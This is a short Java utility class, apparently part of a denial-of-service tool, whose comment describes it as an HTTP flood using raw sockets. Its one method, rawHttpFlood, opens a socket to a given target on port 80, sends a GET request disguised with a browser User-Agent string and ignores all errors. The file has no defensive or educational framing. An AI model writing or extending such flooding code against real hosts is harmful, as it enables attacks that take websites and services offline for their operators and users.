package com.utils;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;

/**
 * Created by Conan0xff on 2017/11/22.
 */

public class HttpFloodUtils {

    //********************************************************************************************************************************************************
    //使用原始套接字进行http flood
    public static void rawHttpFlood(String target){
        try {
            Socket net = new Socket(target, 80);
            OutputStreamWriter osw=new OutputStreamWriter(net.getOutputStream());
            StringBuffer sb=new StringBuffer();
            sb.append("GET / HTTP/1.1\r\n");
            sb.append("Host: "+target+"\r\n");
            sb.append("User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\r\n");//User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
            sb.append("Connection: close\r\n");
            sb.append("\r\n");
            osw.write(sb.toString());
            osw.flush();
        }
        catch(UnknownHostException e)
        {}
        catch(IOException e)
        {}
    }
    //********************************************************************************************************************************************************
}
